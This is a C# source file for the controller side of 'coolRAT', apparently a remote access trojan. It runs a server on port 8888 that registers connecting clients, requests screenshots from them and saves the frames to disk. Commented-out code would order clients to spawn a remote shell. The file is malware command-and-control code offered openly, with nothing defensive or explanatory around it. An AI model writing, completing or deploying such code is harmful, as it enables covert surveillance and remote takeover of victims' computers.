using coolRAT.Libs;
using coolRAT.Libs.Connections;
using coolRAT.Libs.Packets;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace coolRAT.Master
{
    class Program
    {
        public static Dictionary<Guid, Client> ConnectedClients = new Dictionary<Guid, Client>();
        static void Main(string[] args)
        {
            
            CAP_Server server = new CAP_Server(8888);
            server.OnClientConnected += (s, e) =>
            {
                ConnectedClients.Add(e.Client.UniqueId, e.Client);
                e.Client.ClientPingService.Start(PingServiceType.Passive);
                e.Client.ClientPingService.ConnectionLost += ClientPingService_ConnectionLost;
                /*e.Client.RegisterPacketHandler("ShellConnectedPacket", (s_, e_) =>
                {
                    if (e_.Packet.Type != "ShellConnectedPacket")
                        return;
                    ShellConnectedPacket shellConnectedPacket = ShellConnectedPacket.Deserialize(e_.RawPacket);
                    ShellWindow shellWindow = new ShellWindow(shellConnectedPacket.ShellUniqueId, e.Client);
                    Task.Run(() => shellWindow.ShowDialog());
                });*/
                // Spawn a new shell
                Thread.Sleep(10000);
                //Console.WriteLine($"Told client {e.Client.UniqueId} to spawn a new shell.");
                //ConnectShellPacket packet = new ConnectShellPacket(e.Client.UniqueId);
                //e.Client.SendPacket(packet);
                e.Client.RegisterPacketHandler("ScreenFrame", (s_, e_) =>
                {
                    ScreenFrame frame = ScreenFrame.Deserialize(e_.RawPacket);
                    frame.Frame.Save("test.png");
                });
                RequestFramePacketTemporary requestFramePacketTemporary = new RequestFramePacketTemporary(e.Client.UniqueId);
                e.Client.SendPacket(requestFramePacketTemporary);
            };
            server.Start();
            Console.WriteLine("Client Authorization Protocol server version 1.0.0.0 started");
            Application.Run();
        }

        private static void ClientPingService_ConnectionLost(object sender, ConnectionLostEventArgs e)
        {
            if (!ConnectedClients.ContainsKey(e.Client.UniqueId)) return;
            e.Client.ClientPingService.Stop();
            e.Client.Connection.StopAll();
            ConnectedClients.Remove(e.Client.UniqueId);
        }
    }
}
